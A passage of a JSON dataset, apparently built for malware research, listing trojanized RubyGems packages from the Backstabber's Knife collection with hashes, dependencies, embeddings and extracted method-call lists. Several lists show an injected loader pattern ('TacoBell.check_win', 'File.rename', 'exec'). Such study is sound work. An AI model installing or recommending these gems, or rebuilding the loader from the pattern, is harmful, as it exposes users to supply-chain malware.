'request.logstore', 'request.project', '\"/logstores/\".+', 'request.hashkey', '\"/logstores/\" + logstore.+', '\"/logstores/\".+', 'params.[]=', 'request.hashkey', '\"/logstores/\" + logstore.+', '\"/logstores/\".+', 'send', 'send', 'PutLogsResponse.new', 'respHeaders.[]', 'private', 'headers.[]=', 'body.bytesize.to_s', 'body.bytesize', 'headers.[]=', 'Util.cal_md5', 'headers.[]=', 'headers.[]=', 'headers.[]=', 'headers.[]=', '\"#{scheme}://\" + project + \".\".+', '\"#{scheme}://\" + project.+', '\"#{scheme}://\".+', 'headers.[]=', 'project + \".\".+', 'project.+', 'headers.[]=', 'headers.[]=', 'DateTime.now.httpdate', 'DateTime.now', 'Util.get_request_authorization', 'headers.[]=', '\"LOG \" + @accessKeyId + \":\".+', '\"LOG \" + @accessKeyId.+', '\"LOG \".+', 'url.+', 'sendRequest', 'respText.empty?', 'JSON.parse', 'raise', 'LogException.new', 'getHttpResponse', 'respHeaders.[]', 'respHeaders.[]', 'statusCode.==', 'respons_body_type.==', 'loadJson', 'loadJson', 'respJson.[]', 'respJson.[]', 'raise', 'LogException.new', 'respJson.[]', 'respJson.[]', 'raise', 'LogException.new', 'headers.[]=', 'Addressable::URI.parse', 'uri.query_values=', 'method.downcase.==', 'method.downcase', 'Net::HTTP::Get.new', 'uri.request_uri', 'method.downcase.==', 'method.downcase', 'Net::HTTP::Post.new', 'uri.request_uri', 'methodRequest.body=', '@http.request', 'response.code', 'response.body', 'response.to_hash', 'attr_accessor', 'require', 'attr_accessor', 'timestamp.!', 'Time.now.to_i', 'Time.now', 'attr_accessor', 'attr_accessor', 'headers.[]', 'headers.[]', '@all_headers.[]', 'require', 'include', 'required', 'include', 'required', 'required', 'repeated', 'include', 'repeated', 'optional', 'optional', 'optional', 'attr_accessor', 'require', 'require', 'require', 'require', 'Zlib::Deflate.deflate', 'Digest::MD5.hexdigest(content).upcase', 'Digest::MD5.hexdigest', 'Base64.encode64((HMAC::SHA1.new(key) << content).digest).rstrip', 'Base64.encode64', '(HMAC::SHA1.new(key) << content)\\n.digest', 'HMAC::SHA1.new(key).<<', 'HMAC::SHA1.new', 'headers.each', 'k.=~', 'k.=~', 'h.[]=', 'k.downcase', 'h.keys.sort.map { |e,|\\n  \"#{e}:#{h.[](e).gsub(/^\\\\s+/, \"\")}\"\\n}.join($/).+', 'h.keys.sort.map { |e,|\\n  \"#{e}:#{h.[](e).gsub(/^\\\\s+/, \"\")}\"\\n}.join', 'h.keys.sort.map', 'h.keys.sort', 'h.keys', 'h.[](e).gsub', 'h.[]', 'params.empty?.!', 'params.empty?', 'params.keys.sort.map { |k,|\\n  \"#{k}=#{params.[](k)}\"\\n}.join', 'params.keys.sort.map', 'params.keys.sort', 'params.keys', 'params.[]', 'resource + \"?\".+', 'resource.+', 'key.!', 'method.+', 'headers.[]', 'headers.[]', 'headers.[]', 'headers.[]', 'headers.[](\"Date\").+', 'headers.[]', 'Util.canonicalized_log_headers', 'Util.canonicalized_resource', 'Util.hmac_sha1']",
            "n_tokens": 1395,
            "embedding": "[ 0.00275792 -0.01048488 -0.00167394 ...  0.01304615 -0.02365574\n  0.02058606]",
            "cluster": "0",
            "id": 680,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun-sls_sdk/0.0.9/aliyun-sls_sdk-0.0.9.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun-sls_sdk/0.0.9/aliyun-sls_sdk-0.0.9_extracted",
            "name": "aliyun-sls_sdk",
            "version": "0.0.9",
            "published_at": "2020-02-16T04:32:02.383Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake, beefcake, file-tail, ruby-hmac, addressable, net-http-persistent",
            "SHA-256": "98212fe837db28b3db903bbcac4037176bf8b26bba1bba619fdee6b4721487c7"
        },
        {
            "name_version": "android_command-line-tools-0.1.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/android_command-line-tools/0.1.0/android_command-line-tools-0.1.0_extracted/android_command-line-tools-0.1.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'Tools::CLI.start', 'require', 'require', 'require', 'require', 'desc', 'device', 'puts', 'list_installed_packages', 'device', 'select_installed_package', 'execute_with_serial', 'device', 'file', 'desc', 'device', 'puts', 'list_apk_files', 'files.empty?', 'puts', 'PecoSelector.select_from(files).first', 'PecoSelector.select_from', 'execute_with_serial', 'device', 'desc', 'device', 'puts', 'list_installed_packages', 'device', 'select_installed_package', 'execute_with_serial', 'device', 'desc', 'device', 'puts', 'ENV.[]', 'timestamp', 'execute_with_serial', 'device', 'execute', 'desc', 'device', 'puts', 'timestamp', 'execute_with_serial', 'device', 'Tempfile.new(\"movie_original\").path.+', 'Tempfile.new(\"movie_original\").path', 'Tempfile.new', 'execute_with_serial', 'device', 'Tempfile.new(\"movie_resized\").path.+', 'Tempfile.new(\"movie_resized\").path', 'Tempfile.new', 'execute', 'Tempfile.new(\"movie_palette\").path.+', 'Tempfile.new(\"movie_palette\").path', 'Tempfile.new', 'execute', 'ENV.[]', 'timestamp', 'execute', 'execute', 'private', 'device.nil?', 'device.serial', 'execute', 'puts', 'system', 'DeviceAPI::Android.devices', 'devices.size.<=', 'devices.size', 'devices.first', 'PecoSelector.select_from(devices.map { |device,|\\n  [\"#{device.model} (#{device.serial})\", device]\\n}).first', 'PecoSelector.select_from', 'devices.map', 'device.model', 'device.serial', 'device.list_installed_packages.map', 'device.list_installed_packages', 'p.gsub', 'PecoSelector.select_from(packages).first', 'PecoSelector.select_from', 'Find.find(Dir.pwd).to_a.select', 'Find.find(Dir.pwd).to_a', 'Find.find', 'Dir.pwd', 'f.=~', 'Time.now.strftime', 'Time.now']",
            "n_tokens": 502,
            "embedding": "[-0.00664234  0.00183356 -0.00640375 ... -0.00591703 -0.03099759\n  0.02506148]",
            "cluster": "0",
            "id": 597,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/android_command-line-tools/0.1.0/android_command-line-tools-0.1.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/android_command-line-tools/0.1.0/android_command-line-tools-0.1.0_extracted",
            "name": "android_command-line-tools",
            "version": "0.1.0",
            "published_at": "2020-02-16T04:42:26.561Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec, pry, thor, device_api-android, peco_selector",
            "SHA-256": "9d6b139cdb3479bca0b06d4f822f5b76264ff6964118a16cc79ef337b78d2d98"
        },
        {
            "name_version": "angel-list-0.0.8",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/angel-list/0.0.8/angel-list-0.0.8_extracted/angel-list-0.0.8_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'File.exists?', 'YAML.load_file(\"config/angel_list.yml\").[]', 'YAML.load_file', 'ENV.[]', 'ENV.[]', 'puts', 'oauth_config.inspect', 'AngelList::Config.options=', 'require', 'attr_accessor', 'self.options=', 'Hashie::Mash.new', 'AngelList::Config.methods.include?', 'AngelList::Config.methods', 'self.options=', 'self.options.merge', 'self.options', 'AngelList::Config.options', 'self.options=', 'self.options.merge', 'self.options', 'self.options.[](:site).==', 'self.options.[]', 'self.options', 'self.options=', 'self.options.merge', 'self.options', 'self.client=', 'get_client', 'self.client.auth_code.authorize_url', 'self.client.auth_code', 'self.client', 'self.options.[]', 'self.options', 'OAuth2::Client.new', 'self.options.[]', 'self.options', 'self.options.[]', 'self.options', 'self.options.[]', 'self.options', 'self.token=', 'self.client.auth_code.get_token', 'self.client.auth_code', 'self.client', 'self.options.[]', 'self.options', 'self.token=', 'OAuth2::AccessToken.new', 'self.client', 'attr_accessor', 'self.auth=', 'AngelList::Response.new(r).content', 'AngelList::Response.new', 'parse', 'self.auth.token.get', 'self.auth.token', 'self.auth', 'parse', 'self.auth.token.post', 'self.auth.token', 'self.auth', 'parse', 'self.auth.token.delete', 'self.auth.token', 'self.auth', 'get', 'get', '\"https://api.angel.co/1/feed/\".+', 'id.to_s', 'post', 'delete', 'get', '\"https://api.angel.co/1/follows/batch?ids=\".+', 'array.join', 'get', '\"https://api.angel.co/1/users/\" + id.to_s.+', '\"https://api.angel.co/1/users/\".+', 'id.to_s', 'get', '\"https://api.angel.co/1/users/\" + id.to_s.+', '\"https://api.angel.co/1/users/\".+', 'id.to_s', 'get', '\"https://api.angel.co/1/users/\" + id.to_s.+', '\"https://api.angel.co/1/users/\".+', 'id.to_s', 'get', '\"https://api.angel.co/1/users/\" + id.to_s.+', '\"https://api.angel.co/1/users/\".+', 'id.to_s', 'get', '\"https://api.angel.co/1/startups/\" + id.to_s.+', '\"https://api.angel.co/1/startups/\".+', 'id.to_s', 'get', '\"https://api.angel.co/1/startups/\" + id.to_s.+', '\"https://api.angel.co/1/startups/\".+', 'id.to_s', 'get', 'get', '\"https://api.angel.co/1/jobs/\".+', 'id.to_s', 'get', '\"https://api.angel.co/startups/\" + id.to_s.+', '\"https://api.angel.co/startups/\".+', 'id.to_s', 'get', '\"https://api.angel.co/1/tags/\" + tag_id.to_s.+', '\"https://api.angel.co/1/tags/\".+', 'tag_id.to_s', 'post', 'get', '\"https://api.angel.co/1/messages/\".+', 'thread_id.to_s', 'get', 'get', 'get', '\"https://api.angel.co/1/press?startup_id=\".+', 'startup_id.to_s', 'require', 'attr_accessor', 'self.content=', 'AngelList::Tools.parse', 'response.response.env.[](:body).to_s', 'response.response.env.[]', 'response.response.env', 'response.response', 'self.content', 'get', '\"https://api.angel.co/1/reviews?user_id=\".+', 'get', 'get', '\"https://api.angel.co/1/startups/\".+', 'id.to_s', 'get', '\"https://api.angel.co/1/startup_roles?startup_id=\".+', 'startup_id.to_s', 'post', 'delete', '\"https://api.angel.co/1/status_updates/\".+', 'id.to_s', 'get', 'get', '\"https://api.angel.co/1/tags/\".+', 'id.to_s', 'get', '\"https://api.angel.co/1/tags/\" + id.to_s.+', '\"https://api.angel.co/1/tags/\".+', 'id.to_s', 'get', '\"https://api.angel.co/1/tags/\" + id.to_s.+', '\"https://api.angel.co/1/tags/\".+', 'id.to_s', 'require', 'require', 'require', 'require', 'require', 'self.curb', 'c.body_str', 'Curl.post', 'self.curb', 'c.last_effective_url', 'Curl::Easy.new', 'curl.headers.[]=', 'curl.headers', 'user_agent', 'curl.timeout=', 'curl.follow_location=', 'curl.max_redirects=', 'c.perform', 'Hashie::Mash.new', 'Yajl::Parser.new.parse', 'Yajl::Parser.new', 'Yajl::Encoder.encode', 'array_of_numbers.[]', 'rand', 'array_of_numbers.size', 'Digest::SHA1.hexdigest', 'array_of_agents.[]', 'rand', 'array_of_agents.size', 'Hpricot', 'get', 'get', '\"https://api.angel.co/1/users/\".+', 'id.to_s', 'get', '\"https://api.angel.co/1/users/batch?ids=\".+', 'array.join', 'get', '\"https://api.angel.co/1/users/search?slug=\".+', 'URI.escape']",
            "n_tokens": 1366,
            "embedding": "[ 0.0139504  -0.00647663 -0.00902274 ...  0.00964233 -0.04066043\n  0.02627438]",
            "cluster": "0",
            "id": 672,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/angel-list/0.0.8/angel-list-0.0.8.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/angel-list/0.0.8/angel-list-0.0.8_extracted",
            "name": "angel-list",
            "version": "0.0.8",
            "published_at": "2020-02-16T04:45:22.958Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "pry, faraday, hashie, yajl-ruby, oauth2, curb, nokogiri, hpricot",
            "SHA-256": "dac19f5a298a8f33082f70561c15f575058aaebf95132176d4306c788aca48fe"
        },
        {
            "name_version": "ansible-tower_client-0.21.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/ansible-tower_client/0.21.0/ansible-tower_client-0.21.0_extracted/ansible-tower_client-0.21.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'attr_accessor', 'NullLogger.new', 'require', 'include', '\"An unknown error was returned from the provider\".freeze', 'attr_reader', 'JSON.parse', 'get(\"config\").body', 'get', 'config.[]', 'config', 'JSON.parse(get(\"me/\").body).fetch_path', 'JSON.parse', 'get(\"me/\").body', 'get', 'Collection.new', 'activity_stream_class', 'Collection.new', 'ad_hoc_command_class', 'Collection.new', 'credential_class', 'Collection.new', 'credential_type_class', 'Collection.new', 'group_class', 'Collection.new', 'host_class', 'Collection.new', 'inventory_class', 'Collection.new', 'inventory_source_class', 'Collection.new', 'inventory_update_class', 'Collection.new', 'job_class', 'Collection.new', 'job_event_class', 'Collection.new', 'job_play_class', 'Collection.new', 'job_template_class', 'Collection.new', 'organization_class', 'Collection.new', 'project_class', 'Collection.new', 'project_update_class', 'Collection.new', 'schedule_class', 'Collection.new', 'system_job_class', 'Collection.new', 'system_job_template_class', 'Collection.new', 'workflow_job_node_class', 'Collection.new', 'workflow_job_class', 'Collection.new', 'workflow_job_template_class', 'Collection.new', 'workflow_job_template_node_class', 'require', 'instance.respond_to?', 'instance', 'build_path_to_resource', 'args.shift', 'args.unshift', 'logger.debug', 'logger', 'self.class.name', 'self.class', 'args.inspect', 'instance.send(method_name, *args, &block).tap', 'instance.send', 'instance', 'logger.debug', 'logger', 'self.class.name', 'self.class', 'log_from_response', 'raise', 'raise', 'raise', 'instance.respond_to?', 'instance', 'Gem::Version.new(version).between?', 'Gem::Version.new', 'version', 'Gem::Version.new', 'Gem::Version.new', 'private', 'instance.url_prefix.path.==', 'instance.url_prefix.path', 'instance.url_prefix', 'instance', 'File.join', 'instance.url_prefix.path', 'instance.url_prefix', 'instance', 'Regexp.last_match.[]', 'Regexp.last_match', 'attr_reader', 'superclass.==', 'superclass', 'superclass.base_class', 'superclass', 'base_class.to_s.split(/::/).[](1).tableize.to_s.freeze', 'base_class.to_s.split(/::/).[](1).tableize.to_s', 'base_class.to_s.split(/::/).[](1).tableize', 'base_class.to_s.split(/::/).[]', 'base_class.to_s.split', 'base_class.to_s', 'base_class', 'json_or_hash.kind_of?', 'JSON.parse', 'raw_hash.key?', 'raw_hash', 'self.class.send', 'self.class', 'raw_hash.[](\"related\").keys', 'raw_hash.[]', 'raw_hash', 'raw_hash', 'api.post(\"#{endpoint}/\", attributes).body', 'api.post', 'endpoint', 'new', 'JSON.parse', 'create!', '@api.patch', 'url', 'attributes.to_json', 'attributes.each', 'override_raw_attributes.[]', 'override_raw_attributes', 'respond_to?', 'send', 'AnsibleTowerClient.logger.warn', 'AnsibleTowerClient.logger', 'update_attributes!', '@api.patch', 'url', 'to_h.to_json', 'to_h', 'save!', '@api.delete', 'url', 'destroy!', 'YAML.safe_load', 'send', 'private', 'self.class.const_defined?', 'self.class', 'self.class.const_get', 'self.class', 'self.class.const_set', 'self.class', 'Class.new', 'model_klass.new', 'api', 'private', 'Set.new', 'id_attrs.|', 'id_attrs', 'Set.new', 'attrs.collect', 'key.to_s', 'key.end_with?(\"_id\").!', 'key.end_with?', 'id_attrs.include?', 'id_attrs', 'key.underscore', '\"activity_stream\".freeze', 'api.post', 'api', 'url', '{ \"ssh\" => \"Machine\", \"net\" => \"Network\", \"scm\" => \"Source Control\", \"aws\" => \"Amazon Web Services\", \"vmware\" => \"VMware vCenter\", \"satellite6\" => \"Red Hat Satellite 6\", \"cloudforms\" => \"Red Hat CloudForms\", \"gce\" => \"Google Compute Engine\", \"azure_rm\" => \"Microsoft Azure Resource Manager\", \"openstack\" => \"OpenStack\", \"rhv\" => \"Red Hat Virtualization\", \"insights\" => \"Insights\", \"tower\" => \"Ansible Tower\" }.invert', 'KIND_CHOICES.default=', 'KIND_CHOICES.freeze', '@data.[]', 'begin\\n  kind = credential_type.kind\\n  if kind == \"cloud\"\\n    KIND_CHOICES.[](credential_type.name)\\n  else\\n    kind\\n  end\\nend.to_s', 'credential_type.kind', 'credential_type', 'kind.==', 'KIND_CHOICES.[]', 'credential_type.name', 'credential_type', 'api.credential_types.find', 'api.credential_types', 'api', 'credential_type_id', '@data.[]', 'respond_to?', 'inputs.respond_to?', 'inputs', '(if has_vault_password\\n  inputs.vault_password\\nend)\\n.to_s', 'inputs.vault_password', 'inputs', 'Collection.new(api).find_all_by_url', 'Collection.new', 'api', 'related.[]', 'related', 'Collection.new(api, api.group_class).find_all_by_url', 'Collection.new', 'api', 'api.group_class', 'api', 'related.[]', 'related', 'Collection.new(api, api.inventory_source_class).find_all_by_url', 'Collection.new', 'api', 'api.inventory_source_class', 'api', 'related.[]', 'related', 'inventory_sources.each', 'inventory_sources', 'inventory_source.can_update?', 'inventory_source.update', 'Collection.new(api).find_all_by_url', 'Collection.new', 'api', 'related.[]', 'related', 'api.get(related.[](\"update\").to_s).body', 'api.get', 'api', 'related.[](\"update\").to_s', 'related.[]', 'related', 'JSON.parse', 'updatable.[]', 'api.post(related.[](\"update\").to_s).body', 'api.post', 'api', 'related.[](\"update\").to_s', 'related.[]', 'related', 'JSON.parse', 'api.inventory_updates.find', 'api.inventory_updates', 'api', 'update.[]', 'extra_vars.empty?', 'extra_vars', 'hashify', 'Collection.new(api, api.job_event_class).find_all_by_url', 'Collection.new', 'api', 'api.job_event_class', 'api', 'related.[]', 'related', 'related.[]', 'related', 'api.get(\"#{out_url}?format=#{format}\").body', 'api.get', 'api', '{ job_tags: :ask_tags_on_launch, job_type: :ask_job_type_on_launch, limit: :ask_limit_on_launch, inventory: :ask_inventory_on_launch, credential: :ask_credential_on_launch }.freeze', 'private_constant', 'validate_launch_options', 'url', 'api.post(launch_url, options).body', 'api.post', 'api', 'JSON.parse', 'api.jobs.find', 'api.jobs', 'api', 'job.[]', 'related.[]', 'related', 'api.get(spec_url).body', 'api.get', 'api', 'survey_spec.nil?', 'survey_spec', 'hashify', 'extra_vars.empty?', 'extra_vars', 'hashify', 'private', 'REQUIRED_ATTRIBUTES_FOR_OPTIONS.select { |option, checkmark|\\n  options.values_at(option.to_sym, option.to_s).any?(&:present?) && !(respond_to?(checkmark) && send(checkmark))\\n}.keys', 'REQUIRED_ATTRIBUTES_FOR_OPTIONS.select', 'options.values_at(option.to_sym, option.to_s).any?', 'options.values_at', 'option.to_sym', 'option.to_s', '(respond_to?(checkmark) && send(checkmark))\\n.!', 'respond_to?', 'send', 'ignored_options.empty?', 'raise', 'ignored_options.join', 'Collection.new(api).find_all_by_url', 'Collection.new', 'api', 'related.[]', 'related', 'api.get(related.[](\"update\").to_s).body', 'api.get', 'api', 'related.[](\"update\").to_s', 'related.[]', 'related', 'JSON.parse', 'updatable.[]', 'api.post(related.[](\"update\").to_s).body', 'api.post', 'api', 'related.[](\"update\").to_s', 'related.[]', 'related', 'JSON.parse', 'api.project_updates.find', 'api.project_updates', 'api', 'update.[]', 'related.raw_hash.key?', 'related.raw_hash', 'related', '(update_id = related.last_update)\\n.blank?', 'related.last_update', 'related', 'numberish?(update_id).!', 'numberish?', 'raw_hash.key?', 'raw_hash', 'summary_fields.raw_hash.key?', 'summary_fields.raw_hash', 'summary_fields', 'summary_fields.last_update.id', 'summary_fields.last_update', 'summary_fields', 'api.project_updates.find', 'api.project_updates', 'api', 'private', 'value.kind_of?', 'value.to_s.=~', 'value.to_s', 'api.get(\"#{related.[](\"stdout\")}?format=#{format}\").body', 'api.get', 'api', 'related.[]', 'related', 'JSON.parse', 'api.post(\"#{url}launch/\", { \"extra_vars\" => extra_vars }).body', 'api.post', 'api', 'url', 'api.system_jobs.find', 'api.system_jobs', 'api', 'response.[]', 'Collection.new(api).find_all_by_url', 'Collection.new', 'api', 'related.[]', 'related', 'Collection.new(api).find_all_by_url', 'Collection.new', 'api', 'related.[]', 'related', 'extra_vars.empty?', 'extra_vars', 'hashify', 'api.workflow_jobs.find', 'api.workflow_jobs', 'api', 'workflow_job_id', 'job?', 'api.jobs.find', 'api.jobs', 'api', 'job_id', 'respond_to?(:job_id).!', 'respond_to?', 'job_id.nil?', 'job_id', 'related.job.match?', 'related.job', 'related', '\"workflow_job_templates\".freeze', 'url', 'api.post(launch_url, options).body', 'api.post', 'api', 'JSON.parse', 'api.workflow_jobs.find', 'api.workflow_jobs', 'api', 'job.[]', 'Collection.new(api).find_all_by_url', 'Collection.new', 'api', 'related.[]', 'related', 'attr_reader', 'find_all_by_url', 'klass.endpoint', 'klass', 'Enumerator.new', 'loop', '@collection.empty?', 'fetch_more_results', '@collection.empty?', 'raise', 'yielder.yield', '@collection.shift', 'build_object', 'parse_response', 'api.get', 'api', 'find_uri', 'klass.create!', 'klass', 'api', 'klass.create', 'klass', 'api', 'private', 'api.send', 'api', 'next_page.nil?', 'parse_response', 'api.get', 'api', 'parse_result_set', 'File.join', 'klass.endpoint', 'klass', 'id.to_s', 'JSON.parse', 'response.body', 'body.class.name', 'body.class', 'body.[](\"results\").each', 'body.[]', '@collection.<<', 'build_object', 'body.[]', '(klass || class_from_type(result.[](\"type\")))\\n.new', 'klass', 'class_from_type', 'result.[]', 'api', 'require', 'attr_reader', 'options.nil?', 'options.[](:username).!', 'options.[]', 'options.[](:password).!', 'options.[]', 'raise', 'options.[]', 'raise', 'options.[]', 'AnsibleTowerClient.logger', 'options.[]', 'verify_ssl.==', 'require', 'require', 'require', 'Faraday::Response.register_middleware', 'lambda', 'options.[](:proxy).present?', 'options.[]', 'connection_opts.[]=', 'options.[]', 'options.[](:headers).present?', 'options.[]', 'connection_opts.[]=', 'options.[]', 'options.[](:request).present?', 'options.[]', 'connection_opts.[]=', 'options.[]', 'Faraday.new', 'options.[]', 'f.use', 'f.use', 'f.request', 'f.response', 'f.response', 'f.adapter', 'Faraday.default_adapter', 'f.basic_auth', 'options.[]', 'options.[]', 'Api.new', 'connection', 'private', 'key.to_s.underscore', 'key.to_s', 'modelized_list.|', 'modelized_list', 'Set.new', 'attrs.map', 'Set.new', 'key_to_attribute(key).gsub', 'key_to_attribute', 'attr_excluded?', 'value.collect', 'elem.kind_of?', 'parent.send', 'method.camelize.singularize', 'method.camelize', 'parent.send', 'method.camelize', 'add_accessor_methods', 'modelized_list.include?', 'modelized_list', 'method.to_s', 'instance_methods.include?', 'instance_methods', 'method.to_sym', 'class_eval', 'define_method', '@data.[]', 'attr_model', 'generate_writer?', 'class_eval', 'define_method', '@data.[]=', 'json_or_hash.kind_of?', 'JSON.parse', 'Hash.[]', 'raw_hash.collect', 'self.class.send', 'self.class', '@data.[]', 'Hash.[]', '@data.collect', 'value_to_hash', 'alias_method', 'to_h.to_json', 'to_h', 'alias_method', 'self.class', 'string.<<', '@data.collect { |key, value|\\n  \"#{self.class.send(:key_to_attribute, key)}=#{value.inspect}\"\\n}.join', '@data.collect', 'self.class.send', 'self.class', 'value.inspect', 'string.<<', 'other.kind_of?', 'to_h.==', 'to_h', 'other.to_h', 'alias_method', 'private', 'value.to_h', 'value.collect', 'elem.kind_of?', 'elem.to_h', 'self.class.const_defined?', 'self.class', 'self.class', 'self.class.const_get', 'self.class', 'self.class.const_set', 'self.class', 'Class.new', 'model_klass.new', 'require', 'extend', 'delegate', 'JSON.parse(response.body).pretty_inspect', 'JSON.parse', 'response.body', 'response.body', 'include', 'CLIENT_ERROR_STATUSES.include?', 'env.[]', 'logger.debug', 'logger', 'self.class.name', 'self.class', 'env.pretty_inspect', 'logger.error', 'logger', 'self.class.name', 'self.class', 'log_from_response', 'env.[]', 'raise', 'raise', 'response_values', 'raise', 'raise', 'env.body', 'env.response_headers', 'env.status', 'env.body', 'env.url', 'require', 'url', 'options.dup', 'options.delete', 'options.delete', 'with_temporary_changes', 'api.post(launch_url, options).body', 'api.post', 'api', 'JSON.parse', 'api.jobs.find', 'api.jobs', 'api', 'job.[]', 'private', 'limit', 'patch', 'patch', 'api.patch', 'api', 'req.url', 'url', 'req.headers.[]=', 'req.headers', 'req.body=', '\"0.21.0\".freeze']",
            "n_tokens": 3535,
            "embedding": "[-0.01346245 -0.01113113 -0.00754815 ...  0.00838417 -0.02805235\n  0.01475232]",
            "cluster": "0",
            "id": 116,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/ansible-tower_client/0.21.0/ansible-tower_client-0.21.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/ansible-tower_client/0.21.0/ansible-tower_client-0.21.0_extracted",
            "name": "ansible-tower_client",
            "version": "0.21.0",
            "published_at": "2020-02-16T04:49:17.300Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "factory_bot, rake, rspec, activesupport, faraday, faraday_middleware, more_core_extensions",
            "SHA-256": "257d505fa46bfec662aba6fcc8406dd7692a7c31c26281732c08e4d7b2a46c0c"
        },
        {
            "name_version": "apibanca_client-0.0.8",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apibanca_client/0.0.8/apibanca_client-0.0.8_extracted/apibanca_client-0.0.8_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'conn_url.get', 'conn_url', 'req.url', 'req.headers.[]=', 'req.headers', 'conn_form.post', 'conn_form', 'req.url', 'req.headers.[]=', 'req.headers', 'req.body=', 'conn_form.patch', 'conn_form', 'req.url', 'req.headers.[]=', 'req.headers', 'req.body=', 'conn_form.delete', 'conn_form', 'req.url', 'req.headers.[]=', 'req.headers', 'check_requirements!', 'Faraday.new', 'f.request', 'f.request', 'f.response', 'f.response', 'f.response', 'f.adapter', 'Faraday.default_adapter', 'check_requirements!', 'Faraday.new', 'f.request', 'f.request', 'f.response', 'f.response', 'f.response', 'f.adapter', 'Faraday.default_adapter', 'include', 'raise', 'private', 'raise', 'raise', 'require', 'require', 'require', 'require', 'require', 'set_relative_url', 'bank_params.is_a?', 'raise', 'client.post', 'url', 'bank_params.to_hash', 'Apibanca::Bank.new', 'r.body', 'bank.load_routines!', 'client.get', 'url', 'Apibanca::Bank.new', 'r.body', 'bank.load_routines!', 'client.get', 'url', 'r.body.map', 'r.body', 'Apibanca::Bank.new', 'bank.load_routines!', 'obj_client.get', 'obj_client', 'url', 'self.merge!', 'r.body', 'self.load_routines!', 'obj_client.patch', 'obj_client', 'url', 'routine_params.is_a?', 'raise', 'obj_client.post', 'obj_client', 'url', 'routine_params.to_hash', 'r.body.routines.each', 'r.body.routines', 'r.body', 'self.routines.any?', 'self.routines', 'r.id.==', 'r.id', 'routine.id', 'Apibanca::Routine.new', 'obj_client', 'new_routine.refresh!', 'self.routines.<<', 'self.routines', 'routines.last', 'routines', 'obj_client.delete', 'obj_client', 'url', 'obj_client.get', 'obj_client', 'url', 'self.deposits=', 'r.body.map', 'r.body', 'Apibanca::Deposit.new', 'obj_client', 'obj_client.get', 'obj_client', 'url', 'self.jobs=', 'r.body.each', 'r.body', 'Apibanca::Job.new', 'obj_client', 'id', 'name', 'user', 'account', 'name', 'user', 'account', 'name', 'user', 'account', 'self.routines.map!', 'self.routines', 'Apibanca::Routine.new', 'self.obj_client', 'self.routines.each', 'self.routines', 'r.refresh!', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'obj_client.get', 'obj_client', 'obj_bank.url', 'obj_bank', 'self.id', 'h.body.map', 'h.body', 'Apibanca::DepositVersion.new', 'dv.obj_deposit=', 'id', 'self.raw_date', 'self.psd_type', 'self.psd_type', 'self.raw_comment', 'self.raw_amount', 'load_history', 'raise', 'raise', 'attr_reader', 'set_relative_url', 'client.get', 'url', 'Apibanca::Job.new', 'r.body', 'self.class_eval', '275.+', 'to_s', 'set_relative_url', 'obj_client.get', 'obj_client', 'url', 'self.merge!', 'r.body', 'obj_client.patch', 'obj_client', 'url', 'self.merge!', 'r.body', 'obj_client.patch', 'obj_client', 'url', 'self.merge!', 'r.body', 'obj_client.patch', 'obj_client', 'url', 'self.merge!', 'r.body', 'params.is_a?', 'raise', 'obj_client.patch', 'obj_client', 'url', 'params.to_hash', 'self.merge!', 'r.body', 'obj_client.get', 'obj_client', 'url', 'self.tasks=', 'r.body', 'obj_client.delete', 'obj_client', 'url', 'self.obj_bank.routines.any?', 'self.obj_bank.routines', 'self.obj_bank', 'self.obj_bank.routines.select!', 'self.obj_bank.routines', 'self.obj_bank', 'r.id.!=', 'r.id', 'self.id', 'id', 'nombre', 'target', 'what_to_do', 'target', 'scheduled_tasks', 'active.!', 'active', 'property', 'property', 'puts', 